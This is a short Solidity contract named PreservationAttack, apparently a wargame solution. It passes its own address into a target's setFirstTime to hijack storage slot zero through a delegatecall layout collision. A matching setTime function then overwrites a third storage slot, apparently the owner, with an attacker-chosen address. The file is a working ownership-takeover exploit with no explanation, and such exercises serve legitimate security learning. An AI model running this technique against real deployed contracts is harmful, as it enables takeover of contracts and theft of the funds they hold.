// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationAttack {
    address public addressPlaceHolder1;
    address public addressPlaceHolder2;
    address public addressPlaceHolder3;   
    IPreservation preservation;

    constructor(address _preservation) {
        preservation = IPreservation(_preservation);
    }

    function takeSlotZero() public { 
        uint256 castedAddress = uint256(uint160(address(this)));
        preservation.setFirstTime(castedAddress);
    }

    function setTime(uint256 newTime) public { 
        addressPlaceHolder3 = address(uint160(newTime));
    }
}